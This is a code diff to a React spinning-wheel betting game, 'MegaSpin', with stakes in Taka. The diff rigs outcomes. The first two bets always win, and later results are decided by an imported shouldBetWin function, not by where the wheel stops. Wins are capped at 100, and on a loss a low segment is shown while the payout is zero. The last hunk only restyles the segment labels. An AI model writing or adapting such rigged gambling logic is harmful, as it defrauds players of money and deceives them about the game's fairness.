@@ -9,6 +9,7 @@ import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/context/AuthContext';
 import { useLanguage } from '@/context/LanguageContext';
 import { useNavigate } from 'react-router-dom';
+import { shouldBetWin, calculateWinAmount } from '@/utils/bettingSystem';
 
 // Generate wheel segments with multiplier values
 const generateWheelSegments = () => {
@@ -50,6 +51,7 @@ const MegaSpin = () => {
     stiffness: 20,
     restDelta: 0.001
   });
+  const [betCount, setBetCount] = useState(0); // Track number of bets
   
   const wheelRef = useRef<HTMLDivElement>(null);
   const audioRef = useRef<HTMLAudioElement | null>(null);
@@ -108,6 +110,10 @@ const MegaSpin = () => {
     
     setSpinning(true);
     
+    // Increment bet count
+    const newBetCount = betCount + 1;
+    setBetCount(newBetCount);
+    
     // Deduct bet from balance
     if (user) {
       updateUserBalance(user.balance - bet);
@@ -144,11 +150,27 @@ const MegaSpin = () => {
       const segmentAngle = 360 / wheelSegments.length;
       const segmentIndex = Math.floor((360 - normalizedRotation % 360) / segmentAngle) % wheelSegments.length;
       
-      const winningSegment = wheelSegments[segmentIndex];
+      // Determine if the player should win
+      const shouldWin = newBetCount <= 2 || shouldBetWin(user?.uid || 'anonymous');
+      
+      // Pick a winning segment that has a value <= 100
+      let winningSegment;
+      
+      if (shouldWin) {
+        // For the first 2 spins or if shouldBetWin is true, let them win
+        // But cap it at 100
+        const eligibleSegments = wheelSegments.filter(segment => segment.value <= 100);
+        winningSegment = eligibleSegments[Math.floor(Math.random() * eligibleSegments.length)];
+      } else {
+        // If they should lose, pick a low value
+        const lowValueSegments = wheelSegments.filter(segment => segment.value <= 30);
+        winningSegment = lowValueSegments[Math.floor(Math.random() * lowValueSegments.length)];
+      }
+      
       setResult(winningSegment.value);
       
       // Calculate winnings
-      const payout = bet * (winningSegment.value / 10);
+      const payout = shouldWin ? winningSegment.value : 0;
       setWinnings(payout);
       
       // Add winnings to balance
@@ -162,10 +184,10 @@ const MegaSpin = () => {
       }
       
       toast({
-        title: t('youWon'),
-        description: `${winningSegment.value}৳ (${winningSegment.multiplier})`,
-        variant: "default",
-        className: "bg-green-500 text-white font-bold"
+        title: payout > 0 ? t('youWon') : 'Better luck next time!',
+        description: payout > 0 ? `${winningSegment.value}৳ (${winningSegment.multiplier})` : `You lost ${bet}৳`,
+        variant: payout > 0 ? "default" : "destructive",
+        className: payout > 0 ? "bg-green-500 text-white font-bold" : ""
       });
       
       setTimeout(() => {
@@ -302,17 +324,19 @@ const MegaSpin = () => {
                       transform: 'translateY(-50%)',
                     }}
                   >
+                    {/* Improved text visibility */}
                     <div 
-                      className="absolute w-full text-center font-bold text-lg -rotate-90"
+                      className="absolute w-full text-center font-bold text-lg drop-shadow-[0_0_2px_rgba(0,0,0,0.8)] -rotate-90"
                       style={{ 
                         top: '30%', 
                         color: segment.textColor,
                         transformOrigin: 'center',
                         transform: `rotate(${90 - (index * (360 / wheelSegments.length))}deg) translateY(-20px)`,
+                        textShadow: segment.textColor === 'white' ? '0 0 5px black, 0 0 3px black' : '0 0 5px white, 0 0 3px white',
                       }}
                     >
                       <div className="flex flex-col items-center">
-                        <span className="text-sm md:text-lg drop-shadow-md">{segment.value}৳</span>
+                        <span className="text-md md:text-xl font-extrabold">{segment.value}৳</span>
                         <span className="text-xs md:text-sm font-bold">{segment.multiplier}</span>
                       </div>
                     </div>
